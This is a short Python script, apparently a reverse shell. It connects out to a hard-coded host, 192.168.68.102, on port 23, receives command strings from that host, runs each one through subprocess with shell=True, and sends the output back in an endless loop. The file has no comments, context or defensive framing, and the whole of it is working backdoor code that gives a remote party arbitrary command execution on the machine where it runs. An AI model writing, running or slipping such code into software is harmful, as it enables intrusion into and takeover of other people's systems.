import socket, subprocess


s = socket.socket()         
 
port = 23               
hostip = "192.168.68.102"
s.connect((hostip, port)) 

while True:
    instruction = s.recv(1024).decode()
    result = subprocess.run(instruction, capture_output=True, text=True, shell=True)
    s.send(result.stdout.encode()) 
s.close()     
     